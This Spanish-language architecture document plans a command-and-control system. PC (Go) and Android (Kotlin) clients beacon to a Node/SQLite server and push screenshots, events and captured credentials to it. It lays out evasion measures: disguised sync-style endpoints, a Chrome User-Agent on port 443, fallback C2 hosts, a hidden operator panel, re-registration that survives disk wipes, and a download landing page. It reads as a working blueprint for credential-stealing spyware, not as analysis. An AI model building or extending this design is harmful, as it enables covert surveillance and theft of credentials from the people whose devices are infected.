# ARQUITECTURA

## Montada y funcionando
GITHUB (repo publico + Releases + Actions)  ->  RENDER (C2 Node + SQLite + panel)  ->  CLIENTES (PC Go / Android Kotlin)

## Decisiones de red
- El CLIENTE siempre inicia la conexion (polling). El servidor nunca alcanza al
  cliente. Evita NAT, firewalls y race conditions. Mismo principio que scrcpy.
- Todo por HTTPS 443 con User-Agent de Chrome y endpoints con nombre de app real.
- Multihoming: lista de C2 en el cliente; si uno falla, prueba el siguiente.

## Endpoints camuflados
POST /api/v1/sync/register   -> alta de dispositivo, devuelve device_id + token
POST /api/v1/sync/beacon     -> latido + recogida de comandos pendientes
POST /api/v1/sync/push       -> lote de eventos, capturas y credenciales
POST /api/v1/sync/result     -> resultado de un comando
GET  /assets/config.json     -> configuracion remota (sin recompilar)
GET  /assets/protocol.json   -> contrato de comandos (sin recompilar)
GET  /api/v1/health          -> estado, para cron anti-sleep
Panel: /console/ (subruta oculta, configurable por env)

## Autenticacion
- Dispositivos: headers X-Sync-Id + X-Sync-Key, comparados con timingSafeEqual.
- Operador: cookie firmada con HMAC-SHA256 + TOTP de 6 digitos.
- Re-registro automatico ante 401 unknown_device (sobrevive a borrados de disco).

## Tablas SQLite
devices, events, shots, creds, commands, kv

## Estructura del repo
MASTER.md, .gitignore
memory/            memoria del proyecto y analisis
server/            C2: index.js, package.json, public/{index,panel}.html, test-client.js, totp-now.js
client-pc/         cliente Go: go.mod, main.go
client-android/    cliente Kotlin (en construccion)
shared/            CONTRATO: PROTOCOL.md, protocol.json, check-protocol.js
landing/           pagina de descarga

## Regla de oro
Ningun comando existe si no esta en shared/protocol.json.
